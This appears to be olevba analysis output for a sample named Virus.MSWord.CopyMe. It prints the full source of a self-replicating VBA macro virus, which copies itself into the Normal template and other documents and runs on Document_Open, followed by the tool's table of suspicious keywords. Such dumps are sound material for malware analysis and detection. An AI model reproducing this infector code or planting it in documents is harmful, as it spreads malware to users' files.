olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.CopyMe
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.CopyMe - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub CopyMe()
    On Error Resume Next

    Set m = MacroContainer.VBProject.VBComponents(1).CodeModule
    Set d = IIf(MacroContainer Is NormalTemplate, ActiveDocument.VBProject.VBComponents(1).CodeModule, NormalTemplate.VBProject.VBComponents(1).CodeModule)
    
    x = d.procbodyline("CopyMe", vbext_pk_proc)
    If IsEmpty(x) Then
        d.insertlines d.countoflines + 1, m.lines(m.procbodyline("CopyMe", vbext_pk_proc), m.proccountlines("CopyMe", vbext_pk_proc))

        y = d.procbodyline("Document_Open", vb_pk_proc)
        If IsEmpty(y) Then
            d.insertlines d.countoflines + 1, vbCrLf & "Private Sub Document_Open()" & vbCrLf & "    CopyMe" & vbCrLf & "End Sub"
        Else
            d.insertlines y + 1, "    CopyMe"
        End If
    End If
End Sub

Private Sub Document_Open()
    CopyMe
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

